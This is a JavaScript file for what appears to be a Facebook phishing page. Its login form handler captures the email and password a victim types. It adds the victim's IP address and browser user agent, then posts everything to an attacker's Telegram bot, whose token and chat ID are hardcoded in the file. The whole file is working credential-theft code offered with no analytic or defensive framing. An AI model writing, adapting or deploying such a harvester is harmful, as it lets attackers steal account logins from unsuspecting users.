// Function to get current IP address
function getCurrentIPAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP address:', error);
            return 'Unknown';
        });
}

// Function to send message to Telegram bot
function sendMessageToTelegram(message) {
    var botToken = '6846592350:AAFt1AspGQlSdnLjW3S47TK4_UFUSZbvuYY';  // Replace with your Telegram bot token
    var chatId = '1220059074';   // Replace with your Telegram chat ID


    var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    var params = {
        chat_id: chatId,
        text: message
    };

    // Using Fetch API to send POST request to Telegram API
    return fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(params)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        console.log('Message sent to Telegram successfully:', response);
        alert('successfully!');
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
        alert('Failed');
    });
}

// Submit form function
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();  // Prevent the form from submitting
    
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Get current IP address
    getCurrentIPAddress().then(ipAddress => {
        // Get user agent
        var userAgent = navigator.userAgent;

        // Construct message to send to Telegram
        var message = `New Facebook login attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}`;

        // Send message to Telegram
        sendMessageToTelegram(message);
    });

    // Clear input fields (optional)
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';

    // You can also simulate a redirect after successful login
    // window.location.href = '/success.html';
});